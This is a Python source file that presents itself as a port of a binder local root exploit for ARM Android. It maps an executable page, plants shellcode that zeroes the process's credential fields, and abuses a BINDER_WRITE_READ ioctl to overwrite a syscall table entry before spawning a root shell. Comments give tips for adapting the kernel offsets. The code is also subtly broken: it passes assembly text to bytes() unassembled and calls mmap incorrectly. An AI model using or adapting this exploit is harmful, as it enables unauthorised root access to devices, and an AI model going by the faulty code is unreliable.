import os
import sys
import mmap
import struct
import fcntl

# Binder transaction request format
binder_write_read = struct.Struct('qqqqqq')

BR_NOOP = 0x0000720c  # binder memory write value
SC_TABLE = 0xc000ee28  # system call table address

# we need to know the lower halfword of the original address of sys_ni_syscall to tailor MMAP_AREA and MMAP_OFF accordingly.
# you can aid yourself with a NOP block. the higher halfword will in any case become 0x720c. on one of my boxes, the other
# halfword was 0xdac4. MMAP_AREA must be aligned appropriately. you can extract all the data in question at runtime from
# /proc/kallsyms and dmesg (not that hard to set off infoleaks with this bug) as long as there are no contraints in place
MMAP_AREA = 0x720cd000  # userspace landing point page-aligned address.
MMAP_OFF = 0xac4  # offset within it to plant the payload
NUM_PAGES = 16
PAGE_SIZE = 4096
NOP = 0xe1a00000  # mov r0, r0
SHELL = "/system/bin/sh"
TARGET_APERTURE = 68  # aiming for two adjacent non-implemented syscalls. check arch/arm/kernel/calls.S
BINDER_WRITE_READ = 0xc0186201  # printk your BINDER_WRITE_READ ;)

# the target payload
def shellcode():
    asm = [
        "__transgressor:;",
        "push    {r0-r12,lr}",
        "mov     r1, sp",  # calculate the process descriptor location
        "bic     r2, r1, #8128",
        "bic     r2, r2, #63",
        "ldr     r3, [r2, #12]",

        "movt    r0, #0",
        "movw    r0, #0",

        "ldr     r1, [r3, #492]",  # cred's location may differ depending on the kernel config.
        # just build and objdump a kernel module with printk(current->cred->uid)
        # to find out. or pinpoint it with the help of kgdb or whatever ;)
        "mov     r4, #8",
        "__loop_cred:;",
        "sub     r4, r4, #1",
        "str     r0, [r1, #4]!",
        "teq     r4, #0",
        "bne     __loop_cred",

        "ldr     r1, [r3, #488]",  # real_cred. overkill?
        "mov     r4, #8",
        "__loop_real_cred:;",
        "sub     r4, r4, #1",
        "str     r0, [r1, #4]!",
        "teq     r4, #0",
        "bne     __loop_real_cred",

        "ldm     sp!, {r0-r12,pc}",  # return to ret_fast_syscall
        "mov     pc, lr"
    ]
    return asm

def main():
    print("[!] binder local root exploit")
    print("[!] Orginal by (c) piotr szerman")

    fd = os.open("/dev/binder", os.O_RDWR)
    if fd < 0:
        print(f"[-] failed to reach out for binder. ({os.strerror(os.errno)})")
        sys.exit(1)

    map_area = mmap.mmap(MMAP_AREA, NUM_PAGES * PAGE_SIZE, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                         flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS | mmap.MAP_FIXED | mmap.MAP_LOCKED)

    if map_area == -1:
        print("mmap() error")
        sys.exit(1)

    print(f"[+] userspace map area == 0x{MMAP_AREA:08x}")

    print(f"[+] placing NOP block at 0x{MMAP_AREA:08x}")
    map_area[:MMAP_OFF] = bytes([NOP] * MMAP_OFF)
    print(f"[+] copying payload to 0x{MMAP_AREA + MMAP_OFF:08x}")
    # look at the objdump of shellcode to see the correct offset
    map_area[MMAP_OFF:MMAP_OFF + 30 * 4] = bytes([opcode for opcode in shellcode()[8:]])  # offseting to the __transgressor

    print("[+] constructing rogue data structure.")

    bwr = binder_write_read.pack(0, 0, 0, 1, 0, SC_TABLE + TARGET_APERTURE * 4 + 2)
    # targeting the aperture between 2 undefined system calls in the table

    # calculate process descriptor address with the aid of sp:
    # task_struct = *( ((unsigned long *) ( (sp & ~(0xbf000000 - 1)) & ~0x3f )) + 3);

    fcntl.ioctl(fd, BINDER_WRITE_READ, bwr)
    os.close(fd)

    import time
    time.sleep(5)  # give binder ample time to service the transaction. if it's under heavy load, the exploit might fail

    print("[+] r00ting device...\n")

    os.system(SHELL)

    return 1

if __name__ == "__main__":
    main()

